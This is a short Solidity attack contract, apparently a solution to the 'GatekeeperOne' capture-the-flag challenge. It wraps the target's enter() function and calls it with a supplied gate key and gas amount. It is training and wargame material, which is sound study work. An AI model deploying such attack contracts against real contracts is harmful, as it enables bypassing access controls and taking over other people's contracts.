// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IGatekeeperOne {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
  IGatekeeperOne victimContract;

  constructor(address _targetAddress) {
    victimContract = IGatekeeperOne(_targetAddress);
  }

  function attack(bytes8 _key, uint256 _gasAmount) external {
    victimContract.enter{ gas: _gasAmount }(_key);
  }
}
